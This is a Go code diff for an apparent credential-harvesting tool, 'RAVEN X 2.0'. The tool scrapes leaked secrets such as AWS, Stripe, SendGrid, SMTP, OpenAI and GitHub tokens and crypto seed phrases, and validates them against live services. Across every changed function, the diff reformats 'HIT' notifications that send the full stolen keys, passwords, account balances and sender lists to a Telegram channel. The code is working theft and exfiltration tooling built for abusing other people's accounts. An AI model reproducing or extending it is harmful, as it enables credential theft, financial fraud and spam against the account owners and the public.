@@ -19,6 +19,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"math/rand"
 	"regexp"
 	"runtime"
 	"strconv"
@@ -126,7 +127,8 @@ type Config struct {
 		SSRF             bool `json:"ssrf"`
 	} `json:"exploit_methods"`
 	SMTPTestEmail string `json:"smtp_test_email"`
-	EmailTarget   string `json:"email_target"` // Email tujuan untuk testing pengiriman email
+	EmailTarget   string `json:"email_target"`
+	SessionName   string `json:"session_name"` // set by controller; used in Telegram notification headers
 }
 
 type Enhancer struct {
@@ -1190,6 +1192,21 @@ func (a *AWSScanner) sendTelegram(message string) {
 	pterm.Debug.Printfln("[TELEGRAM SENT] Message hash: %s", messageHash[:16]+"...")
 }
 
+// tgHit returns the standard notification header for a credential find.
+//   📬 NEW RANDOM SMTP HIT VIA torch2 3408 ® ID : 43745531
+//   Cracked on https://example.com
+func (a *AWSScanner) tgHit(emoji, hitType, sourceURL string) string {
+	listName := a.Config.SessionName
+	if listName == "" {
+		listName = "scanner"
+	}
+	globalCounters.mu.Lock()
+	cnt := globalCounters.APIsFoundTotal
+	globalCounters.mu.Unlock()
+	hitID := rand.Int63n(90000000) + 10000000
+	return fmt.Sprintf("%s NEW %s HIT VIA %s %d ® ID : %d\nCracked on %s\n", emoji, hitType, listName, cnt, hitID, sourceURL)
+}
+
 // generateTelegramHash membuat unique hash dari message untuk deduplication
 func (a *AWSScanner) generateTelegramHash(message string) string {
 	// Extract key portions yang membuat message unique
@@ -1318,7 +1335,8 @@ func (a *AWSScanner) extractAndSaveCryptoKeys(text, sourceURL string) {
 
 				a.saveIntoFile(cryptoLine, "mnemonic_seed_phrases.txt")
 
-				go a.sendTelegram(fmt.Sprintf("🔥 <b>%s Found (%d words)</b>\nSource: <code>%s</code>\nPhrase: <code>%s</code>", cryptoType, wordCount, sourceURL, keyValue))
+				go a.sendTelegram(a.tgHit("💰", "CRYPTO PHRASE HIT", sourceURL) + fmt.Sprintf(
+					"\n🆔 CREDENTIALS\nPhrase (%d words) : %s\n", wordCount, keyValue))
 
 				globalCounters.mu.Lock()
 				globalCounters.CryptoKeysFound++
@@ -2161,14 +2179,8 @@ func (a *AWSScanner) CheckGitHubToken(token, sourceURL string) bool {
 			globalCounters.TokensValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🐙 <b>VALID GITHUB TOKEN</b>
-
-👤 <b>User:</b> <code>%s</code>
-🔑 <b>Token:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, login, token, sourceURL)
+			msg := a.tgHit("🐙", "GITHUB TOKEN", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nUser : %s\nToken : %s\n", login, token)
 			go a.sendTelegram(msg)
 
 			// Pengecekan Deep Scan
@@ -2361,15 +2373,9 @@ func (a *AWSScanner) ScanRepoWithTruffleHog(repoPath, sourceInfo string) {
 
 			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.DetectorName, result.Secret), "trufflehog_secrets.txt")
 
-			msg := fmt.Sprintf(`💣 <b>TRUFFLEHOG SECRET FOUND</b>
-━━━━━━━━━━━━━━━━━━
-🕵️ <b>Detector:</b> %s
-✅ <b>Verified:</b> %t
-🔑 <b>Secret:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-📄 <b>File:</b> %s
-📦 <b>Commit:</b> %s
-`, result.DetectorName, result.Verified, result.Secret, sourceInfo, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
+			msg := a.tgHit("🔍", "TRUFFLEHOG SECRET", sourceInfo) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nDetector : %s\nVerified : %t\nSecret : %s\nFile : %s\nCommit : %s\n",
+				result.DetectorName, result.Verified, result.Secret, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
 			go a.sendTelegram(msg)
 
 			globalCounters.mu.Lock()
@@ -2435,14 +2441,9 @@ func (a *AWSScanner) ScanRepoWithGitleaks(repoPath, sourceInfo string) {
 
 			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.RuleID, result.Secret), "gitleaks_secrets.txt")
 
-			msg := fmt.Sprintf(`💣 <b>GITLEAKS SECRET FOUND</b>
-━━━━━━━━━━━━━━━━━━
-🕵️ <b>Rule:</b> %s
-🔑 <b>Secret:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-📄 <b>File:</b> %s
-📦 <b>Commit:</b> %s
-`, result.RuleID, result.Secret, sourceInfo, result.File, result.Commit)
+			msg := a.tgHit("🔍", "GITLEAKS SECRET", sourceInfo) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nRule : %s\nSecret : %s\nFile : %s\nCommit : %s\n",
+				result.RuleID, result.Secret, result.File, result.Commit)
 			go a.sendTelegram(msg)
 
 			globalCounters.mu.Lock()
@@ -2503,13 +2504,8 @@ func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🔑 <b>GCP API KEY FOUND</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+			msg := a.tgHit("☁️", "GCP KEY", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
 			go a.sendTelegram(msg)
 			return true
 		} else if resp.StatusCode == 400 {
@@ -2616,13 +2612,8 @@ func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🧠 <b>OPENAI LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+			msg := a.tgHit("🤖", "OPENAI KEY", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
 			go a.sendTelegram(msg)
 			return true
 		} else if resp.StatusCode == 401 {
@@ -2667,13 +2658,8 @@ func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🧠 <b>ANTHROPIC LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+			msg := a.tgHit("🤖", "ANTHROPIC KEY", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
 			go a.sendTelegram(msg)
 			return true
 		} else if resp.StatusCode == 401 {
@@ -2727,15 +2713,9 @@ func (a *AWSScanner) CheckTwilio(sid, auth, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📞 <b>TWILIO LIVE ACCOUNT</b>
-
-🆔 <b>SID:</b> <code>%s</code>
-🔐 <b>Auth:</b> <code>%s</code>
-📶 <b>Status:</b> %s
-🔗 <b>Source:</b> %s
-`, sid, auth, status, sourceURL)
+			msg := a.tgHit("📱", "TWILIO HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nSID : %s\nAuth : %s\nStatus : %s\nName : %s\n",
+				sid, auth, status, friendlyName)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -2771,8 +2751,9 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			json.NewDecoder(resp.Body).Decode(&res)
 			total, _ := res["total"].(float64)
 
-			// Ambil fromEmail dari verified senders
+			// Collect all verified senders
 			var fromEmail string
+			var allSenders []string
 			reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/verified_senders", nil)
 			reqSenders.Header.Set("Authorization", "Bearer "+key)
 			respSenders, err := client.Do(reqSenders)
@@ -2780,11 +2761,16 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 				var sendersResp map[string]interface{}
 				json.NewDecoder(respSenders.Body).Decode(&sendersResp)
 				respSenders.Body.Close()
-				if results, ok := sendersResp["results"].([]interface{}); ok && len(results) > 0 {
-					if firstSender, ok := results[0].(map[string]interface{}); ok {
-						if email, ok := firstSender["from"].(map[string]interface{}); ok {
-							if emailAddr, ok := email["email"].(string); ok && emailAddr != "" {
-								fromEmail = emailAddr
+				if results, ok := sendersResp["results"].([]interface{}); ok {
+					for _, r := range results {
+						if s, ok := r.(map[string]interface{}); ok {
+							if em, ok := s["from"].(map[string]interface{}); ok {
+								if addr, ok := em["email"].(string); ok && addr != "" {
+									allSenders = append(allSenders, addr)
+									if fromEmail == "" {
+										fromEmail = addr
+									}
+								}
 							}
 						}
 					}
@@ -2797,15 +2783,20 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			a.logValid("SendGrid", key)
 			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_sendgrid.txt")
 
-			emailStatus := "❌ Failed"
+			accountType := "Free"
 			quotaInfo := fmt.Sprintf("%.0f Total Credits", total)
+			var quotaLimit, quotaRemaining float64
 			if emailResult["success"].(bool) {
-				emailStatus = "✅ Success"
-				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
-					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
-						quotaInfo = fmt.Sprintf("%.0f/%.0f Credits (Remaining: %.0f)", quotaRemaining, quotaLimit, quotaRemaining)
+				if ql, ok := emailResult["quota_limit"].(float64); ok {
+					quotaLimit = ql
+					if ql >= 10000 {
+						accountType = "Paid"
 					}
 				}
+				if qr, ok := emailResult["quota_remaining"].(float64); ok {
+					quotaRemaining = qr
+				}
+				quotaInfo = fmt.Sprintf("%.0f/%.0f Credits", quotaRemaining, quotaLimit)
 			}
 			a.storeValidKeyLimit("SendGrid", key, quotaInfo)
 
@@ -2813,24 +2804,18 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			quotaDetails := ""
+			sendersLine := "None"
+			if len(allSenders) > 0 {
+				sendersLine = strings.Join(allSenders, ", ")
+			}
+			emailTestLine := "❌ Failed"
 			if emailResult["success"].(bool) {
-				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
-					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
-						quotaDetails = fmt.Sprintf("\n📊 <b>Quota Limit:</b> %.0f\n📬 <b>Remaining:</b> %.0f", quotaLimit, quotaRemaining)
-					}
-				}
+				emailTestLine = fmt.Sprintf("✅ Sent (%.0f/%.0f remaining)", quotaRemaining, quotaLimit)
 			}
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📧 <b>SENDGRID KEY FOUND</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-📊 <b>Limit:</b> %s
-📧 <b>Email Test:</b> %s%s
-🔗 <b>Source:</b> %s
-`, key, quotaInfo, emailStatus, quotaDetails, sourceURL)
+			msg := a.tgHit("📧", "SENDGRID HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nType : %s\nCredits : %s\nSenders : %s\nEmail Test : %s\n",
+				key, accountType, quotaInfo, sendersLine, emailTestLine)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -2881,6 +2866,36 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 				keyType = "Restricted Key"
 			}
 
+			// Parse balance amounts from /v1/balance response
+			var availableAmount, pendingAmount float64
+			var balanceCurrency string
+			if available, ok := res["available"].([]interface{}); ok && len(available) > 0 {
+				if first, ok := available[0].(map[string]interface{}); ok {
+					availableAmount, _ = first["amount"].(float64)
+					balanceCurrency, _ = first["currency"].(string)
+					availableAmount /= 100 // convert cents
+				}
+			}
+			if pending, ok := res["pending"].([]interface{}); ok && len(pending) > 0 {
+				if first, ok := pending[0].(map[string]interface{}); ok {
+					pendingAmount, _ = first["amount"].(float64)
+					pendingAmount /= 100
+				}
+			}
+
+			// Fetch account info for email, country, account ID
+			var acctEmail, acctCountry, acctID string
+			reqAcct, _ := http.NewRequest("GET", "https://api.stripe.com/v1/account", nil)
+			reqAcct.SetBasicAuth(key, "")
+			if respAcct, errAcct := client.Do(reqAcct); errAcct == nil {
+				var acctRes map[string]interface{}
+				json.NewDecoder(respAcct.Body).Decode(&acctRes)
+				respAcct.Body.Close()
+				acctEmail, _ = acctRes["email"].(string)
+				acctCountry, _ = acctRes["country"].(string)
+				acctID, _ = acctRes["id"].(string)
+			}
+
 			a.logValid("Stripe", fmt.Sprintf("%s | Mode: %s | Key: %s", keyType, mode, key))
 			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, keyType, mode, key), "valid_stripe.txt")
 			a.storeValidKeyLimit("Stripe", key, fmt.Sprintf("%s (%s)", keyType, mode))
@@ -2889,15 +2904,11 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-💳 <b>STRIPE KEY FOUND</b>
-
-🔐 <b>Type:</b> %s
-💰 <b>Mode:</b> %s
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, keyType, mode, key, sourceURL)
+			msg := a.tgHit("💳", "STRIPE HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nSecret Key : %s\nAccount ID : %s\nEmail : %s\nCountry : %s\nMode : %s\nAvailable : %.2f %s\nPending : %.2f %s\n",
+				key, acctID, acctEmail, acctCountry, mode,
+				availableAmount, strings.ToUpper(balanceCurrency),
+				pendingAmount, strings.ToUpper(balanceCurrency))
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -2935,13 +2946,8 @@ func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🪙 <b>CRYPTO PRIVATE KEY FOUND</b>
-
-🔐 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+	msg := a.tgHit("💎", "CRYPTO PRIVATE KEY", sourceURL) + fmt.Sprintf(
+		"\n🆔 CREDENTIALS\nKey : %s\n", key)
 	go a.sendTelegram(msg)
 	return true
 }
@@ -3004,22 +3010,9 @@ func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			domainDetails := ""
-			if emailResult["success"].(bool) {
-				if domains, ok := emailResult["domains"].([]string); ok && len(domains) > 0 {
-					domainDetails = fmt.Sprintf("\n🌐 <b>Domains/Identities:</b> %s", strings.Join(domains, ", "))
-				}
-			}
-
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🔫 <b>MAILGUN LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🌐 <b>Domains:</b> %s
-📧 <b>Email Test:</b> %s%s
-🔗 <b>Source:</b> %s
-`, key, domainInfo, emailStatus, domainDetails, sourceURL)
+			msg := a.tgHit("🔫", "MAILGUN HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nDomains : %s\nEmail Test : %s\n",
+				key, domainInfo, emailStatus)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3065,14 +3058,8 @@ func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📞 <b>TELNYX LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-💰 <b>Balance:</b> %s %s
-🔗 <b>Source:</b> %s
-`, key, balance, currency, sourceURL)
+			msg := a.tgHit("📞", "TELNYX HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nBalance : %s %s\n", key, balance, currency)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3118,14 +3105,8 @@ func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🐦 <b>MESSAGEBIRD LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-💰 <b>Balance:</b> %.2f %s
-🔗 <b>Source:</b> %s
-`, key, amount, currency, sourceURL)
+			msg := a.tgHit("🐦", "MESSAGEBIRD HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nBalance : %.2f %s\n", key, amount, currency)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3183,25 +3164,9 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			quotaDetails := ""
-			if emailResult["success"].(bool) {
-				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
-					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
-						quotaDetails = fmt.Sprintf("\n📊 <b>Quota Limit:</b> %.0f\n📬 <b>Remaining:</b> %.0f", quotaLimit, quotaRemaining)
-					}
-				}
-			}
-
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📧 <b>BREVO LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-📧 <b>Email:</b> %s
-🏢 <b>Company:</b> %s
-📧 <b>Email Test:</b> %s%s
-🔗 <b>Source:</b> %s
-`, key, email, company, emailStatus, quotaDetails, sourceURL)
+			msg := a.tgHit("📩", "BREVO HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nEmail : %s\nCompany : %s\nEmail Test : %s\n",
+				key, email, company, emailStatus)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3237,13 +3202,8 @@ func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📧 <b>XSMTP LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+			msg := a.tgHit("📬", "XSMTP HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3282,13 +3242,8 @@ func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-☁️ <b>TENCENT CLOUD KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+			msg := a.tgHit("🔑", "TENCENT KEY", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3341,15 +3296,9 @@ func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📧 <b>MANDRILL LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-👤 <b>User:</b> %s
-📧 <b>Email Test:</b> %s
-🔗 <b>Source:</b> %s
-`, key, username, emailStatus, sourceURL)
+			msg := a.tgHit("📧", "MANDRILL HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nUser : %s\nEmail Test : %s\n",
+				key, username, emailStatus)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3409,15 +3358,9 @@ func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📧 <b>MAILERSEND LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🌐 <b>Domains:</b> %d
-📧 <b>Email Test:</b> %s
-🔗 <b>Source:</b> %s
-`, key, domainCount, emailStatus, sourceURL)
+			msg := a.tgHit("📧", "MAILERSEND HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nAPI Key : %s\nDomains : %d\nEmail Test : %s\n",
+				key, domainCount, emailStatus)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3471,15 +3414,9 @@ func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-💬 <b>NEXMO/VONAGE LIVE</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔐 <b>Secret:</b> <code>%s</code>
-💰 <b>Balance:</b> %.2f EUR
-🔗 <b>Source:</b> %s
-`, key, secret, value, sourceURL)
+			msg := a.tgHit("📱", "NEXMO HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nKey : %s\nSecret : %s\nBalance : %.2f EUR\n",
+				key, secret, value)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3593,17 +3530,9 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 				globalCounters.ValidSMTP++
 				globalCounters.mu.Unlock()
 
-				tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📨 <b>SMTP CRACKED</b>
-
-🖥️ <b>Host:</b> <code>%s</code>
-🔌 <b>Port:</b> <code>%s</code>
-👤 <b>User:</b> <code>%s</code>
-🔑 <b>Pass:</b> <code>%s</code>
-📧 <b>From:</b> %s
-🔗 <b>Source:</b> %s
-`, host, port, user, pass, from, sourceURL)
+				tlgMsg := a.tgHit("📬", "RANDOM SMTP HIT", sourceURL) + fmt.Sprintf(
+					"\n🆔 CREDENTIALS\nHost : %s\nPort : %s\nUser : %s\nPass : %s\nFrom : %s\nSecure : No\n\n📋 SMTP URL\nsmtp://%s:%s@%s:%s\n",
+					host, port, user, pass, from, user, pass, host, port)
 				go a.sendTelegram(tlgMsg)
 				a.storeValidKeyLimit("SMTP", host, "Email Sent")
 			} else {
@@ -3758,7 +3687,8 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 					if len(displayKey) > 100 {
 						displayKey = displayKey[:100] + "..."
 					}
-					msg := fmt.Sprintf("[FOUND] %s\nSource: %s\nValue: %s", check.Name, sourceURL, displayKey)
+					msg := a.tgHit("🔍", check.Name+" HIT", sourceURL) + fmt.Sprintf(
+						"\n🆔 CREDENTIALS\nValue : %s\n", displayKey)
 					go a.sendTelegram(msg)
 				}
 
@@ -4764,17 +4694,9 @@ func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL 
 			globalCounters.ValidSMTP++
 			globalCounters.mu.Unlock()
 
-			tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📨 <b>SMTP CRACKED (AST)</b>
-
-🖥️ <b>Host:</b> <code>%s</code>
-🔌 <b>Port:</b> <code>%s</code>
-👤 <b>User:</b> <code>%s</code>
-🔑 <b>Pass:</b> <code>%s</code>
-📧 <b>From:</b> %s
-🔗 <b>Source:</b> %s
-`, host, port, user, pass, from, sourceURL)
+			tlgMsg := a.tgHit("📬", "RANDOM SMTP HIT", sourceURL) + fmt.Sprintf(
+				"\n🆔 CREDENTIALS\nHost : %s\nPort : %s\nUser : %s\nPass : %s\nFrom : %s\nSecure : No\n\n📋 SMTP URL\nsmtp://%s:%s@%s:%s\n",
+				host, port, user, pass, from, user, pass, host, port)
 			go a.sendTelegram(tlgMsg)
 			a.storeValidKeyLimit("SMTP", host, "Email Sent (AST)")
 		}
@@ -4892,31 +4814,10 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 		consoleLink = fmt.Sprintf("<a href='%s'>LOGIN CONSOLE</a>", fedInfo["federation_console_url"])
 	}
 
-	// Format report similar to main.py
-	reportMsg := strings.Join(reportLines, "\n")
-
 	emailStatus := "❌ Failed"
 	if emailResult["success"].(bool) {
 		emailStatus = fmt.Sprintf("✅ Success (From: %s, Region: %s)", emailResult["from_email"], emailResult["region"])
 	}
-
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-☁️ <b>AWS ACCOUNT COMPROMISED</b>
-
-👤 <b>User/Role:</b> <code>%s</code>
-🆔 <b>Account:</b> <code>%s</code>
-🔑 <b>Credentials:</b> <code>%s</code>
-🔗 <b>Console:</b> %s
-📦 <b>S3 Status:</b> %s
-🛡️ <b>IAM Audit:</b> %s
-📧 <b>Email Test:</b> %s
-
-<pre>%s</pre>
-
-<b>Quota & Limits (SES):</b>
-%s
-`, userOrRole, *identity.Account, keyLine, consoleLink, s3Status, iamAuditResult, emailStatus, reportMsg, sesDetails)
 
 	a.saveIntoFile(fmt.Sprintf("AWS %s SES: %+v SNS: %+v Fargate: %+v IAM Audit: %s", keyLine, sesInfo, snsInfo, fargateInfo, iamAuditResult), "aws_deep_scan.txt")
 
@@ -4925,12 +4826,16 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 
 	if hasLimits && emailSuccess {
 		// Full notification: SES-capable account that can send email
+		msg := a.tgHit("🤴", "AWS AKIA HIT", sourceURL) + fmt.Sprintf(
+			"\n🆔 CREDENTIALS\nAccess Key : %s\nSecret Key : %s\nAccount : %s\nUser/Role : %s\nS3 : %s\nConsole : %s\nIAM Audit : %s\nEmail Test : %s\nSES Quota : %.0f/24h\n",
+			ak, sk, *identity.Account, userOrRole, s3Status, consoleLink, iamAuditResult, emailStatus, maxQuota)
 		go a.sendTelegram(msg)
 		pterm.Success.Printfln("[AWS NOTIF] Full Telegram for %s (SES + Email)", ak[:8]+"...")
 	} else {
-		// Always notify for valid AWS key regardless of email capability
-		simpleMsg := fmt.Sprintf("☁️ <b>VALID AWS KEY</b>\n\n👤 <b>Identity:</b> <code>%s</code>\n🆔 <b>Account:</b> <code>%s</code>\n🔑 <b>Key:</b> <code>%s</code>\n📦 <b>S3:</b> %s\n🔗 <b>Source:</b> %s\n\n⚠️ No SES/email capability detected",
-			userOrRole, *identity.Account, ak, s3Status, sourceURL)
+		// Simplified: valid key but no SES email capability
+		simpleMsg := a.tgHit("🤴", "AWS AKIA HIT", sourceURL) + fmt.Sprintf(
+			"\n🆔 CREDENTIALS\nAccess Key : %s\nSecret Key : %s\nAccount : %s\nUser/Role : %s\nS3 : %s\nSES : ❌ No email capability\n",
+			ak, sk, *identity.Account, userOrRole, s3Status)
 		go a.sendTelegram(simpleMsg)
 		pterm.Warning.Printfln("[AWS NOTIF] Simplified Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
 	}
